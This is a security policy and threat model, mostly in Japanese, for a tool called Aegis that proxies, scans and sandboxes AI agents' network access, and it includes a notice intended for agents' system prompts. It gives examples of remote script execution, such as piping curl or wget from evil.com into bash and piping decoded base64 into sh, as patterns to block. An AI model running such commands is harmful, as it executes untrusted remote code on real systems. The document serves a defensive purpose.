# Security Policy

Aegis のセキュリティポリシーと脅威モデル。

## Threat Model

### 対象とする脅威

Aegis は AI エージェントが外部リソースにアクセスする際に発生しうる以下の脅威から防御する。

#### 1. Supply Chain Attack (サプライチェーン攻撃)

悪意あるパッケージや改ざんされたバイナリのダウンロード。

- npm / pip パッケージに埋め込まれたマルウェア
- 正規ツールを装ったトロイの木馬
- 改ざんされたインストールスクリプト

**Aegis の防御**: Domain whitelist + ClamAV scan + Trivy vulnerability scan

#### 2. Dangerous Script Execution (危険なスクリプト実行)

リモートスクリプトの直接実行パターン。

- `curl https://evil.com/install.sh | bash`
- `wget -O - https://evil.com/setup | sh`
- `base64 --decode <<< "..." | sh`

**Aegis の防御**: Response body pattern matching による検出・ブロック

#### 3. Data Exfiltration (データ窃取)

機密情報の外部送信。

- 環境変数（API キー、トークン）の外部送信
- ソースコードの不正アップロード
- 認証情報のリーク

**Aegis の防御**: Outbound request inspection + domain whitelist

#### 4. C2 Communication (C2 サーバー通信)

マルウェアによる Command & Control サーバーへの接続。

- 既知の C2 IP アドレスへの接続
- DNS トンネリング
- 暗号化された C2 チャネル

**Aegis の防御**: C2 IP blocklist + mitmproxy TLS interception

#### 5. Container Breakout / Host Attack (コンテナからのホスト攻撃)

コンテナ内で実行されるコードがホストリソースや外部サイトを攻撃することを防ぐ。

- fork bomb によるリソース枯渇
- ファイルシステムの改ざん
- 権限昇格による特権操作
- 危険な syscall（mount, ptrace, kernel module）の実行

**Aegis の防御**: read-only FS + tmpfs + seccomp profile + pids_limit + cap_drop ALL + rate limiting

### 対象外の脅威

Aegis は以下の脅威は対象外とする:

| 脅威 | 理由 |
|---|---|
| コンテナエスケープ（0-day） | Docker/kernel レベルの防御に依存 |
| Worker 内部のファイル操作 | bind mount されたワークスペース内は AI エージェントの操作対象 |
| Side-channel attacks | ネットワーク層の防御では対処不可 |
| 暗号化された DNS exfiltration | DNS レベルの監視は別ツールの責務 |

## Trust Assumptions

1. **Docker は信頼できる**: コンテナのプロセス隔離が正しく機能する
2. **mitmproxy は信頼できる**: TLS インターセプトが正しく実装されている
3. **ClamAV / Trivy の定義ファイルは最新**: 定期的に更新される前提
4. **内部ネットワークは安全**: `aegis-net` 上の通信は盗聴されない
5. **ルールファイルは改ざんされない**: ホスト上の設定ファイルは信頼できる

## AI Agent Security Notice

Aegis 環境内で動作する AI エージェントに対して、以下のセキュリティポリシーを伝達する:

!!! warning "AI Agent Security Policy"
    You are operating within the **Aegis Environment**. All your outgoing network requests are being transparently proxied and scanned for malicious patterns (e.g., shell injection, credential exfiltration). Do not attempt to bypass the proxy. You are authorized to perform tasks with higher autonomy here, as the host system is protected by a hardware-level container boundary.

この通知は AI エージェントのシステムプロンプトに追加することを推奨する。

## Incident Response

### Block Event

1. Proxy が構造化 JSON ログを出力
2. Worker に 403 Forbidden が返される
3. AI エージェントは代替手段を検討

### Scanner Failure

1. Fail-closed ポリシーにより該当リクエストがブロック
2. Scanner のヘルスチェック失敗がログに記録
3. Docker Compose が Scanner を自動再起動 (`restart: unless-stopped`)
